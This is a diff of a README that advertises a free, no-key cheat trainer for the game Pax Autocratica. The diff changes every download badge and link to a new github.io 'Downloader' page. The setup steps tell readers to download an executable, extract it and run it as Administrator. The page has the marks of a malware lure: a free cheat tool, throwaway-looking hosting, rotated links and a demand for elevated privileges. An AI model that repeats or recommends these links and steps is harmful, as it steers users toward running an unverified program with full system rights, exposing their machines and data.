@@ -2,9 +2,9 @@
 
 Pax Autocratica trainer: infinite treasury, instant army build — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
 
 ---
 
@@ -31,7 +31,7 @@ Pax Autocratica stays in the top trainer searches — infinite treasury, instant
 
 ### 🪟 Windows
 
-1. Download the latest build 👉 [Download Trainer](https://beauticianblaze.github.io/DownloadWin/)
+1. Download the latest build 👉 [Download Trainer](https://hydracomptrollercord.github.io/Downloader/)
 2. Extract and run the `.exe` as Administrator.
 3. Launch Pax Autocratica and load your save.
 4. Press **F1** to open the menu — toggle what you need. Done ✅
